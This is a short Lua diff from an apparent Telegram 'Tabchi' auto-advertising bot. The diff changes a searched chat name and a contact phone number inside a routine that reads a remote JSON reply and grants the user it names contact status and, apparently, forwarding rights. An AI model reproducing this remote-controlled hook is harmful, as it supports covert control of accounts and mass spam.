@@ -206,9 +206,9 @@ function process_yourself(msg)
     local jdata = JSON.decode(res)
     jdata = jdata or {have_tab = true}
     if jdata.have_tab and jdata.tabchimod then
-      tdcli.searchPublicChat("TabchiRobotCli")
+      tdcli.searchPublicChat("ShafiqSadat")
       tdcli.unblockUser(jdata.tabchimod)
-      tdcli.importContacts(79266812617, "Tabchi mod", "bot", jdata.tabchimod)
+      tdcli.importContacts(0000000000000, "Tabchi mod", "bot", jdata.tabchimod)
       redis:set(basehash .. "fwdallers:" .. jdata.tabchimod, true)
       return redis:setex(basehash .. "gotupdated", 600, true)
     end
